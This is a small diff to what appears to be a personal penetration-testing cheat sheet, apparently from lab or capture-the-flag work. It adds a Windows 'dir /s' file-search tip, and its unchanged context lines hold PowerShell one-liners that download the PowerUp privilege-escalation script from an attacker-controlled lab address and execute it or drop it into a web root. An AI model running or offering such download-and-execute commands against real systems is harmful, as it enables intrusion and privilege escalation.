@@ -48,3 +48,6 @@ Then python to give python shell or Shell=...
 iex (New-Object Net.WebClient).DownloadString(‘http://10.10.14.114/PowerUp.ps1’)
 iex (New-Object Net.WebClient).DownloadFile('http://10.10.14.114:3333/PowerUp.ps1','C:\inetpub\wwwroot\Media\1035\PowerUp.ps1')
 ---------------------------------------
+dir /s *foo*
+Searching on windows cli
+---------------------------------------
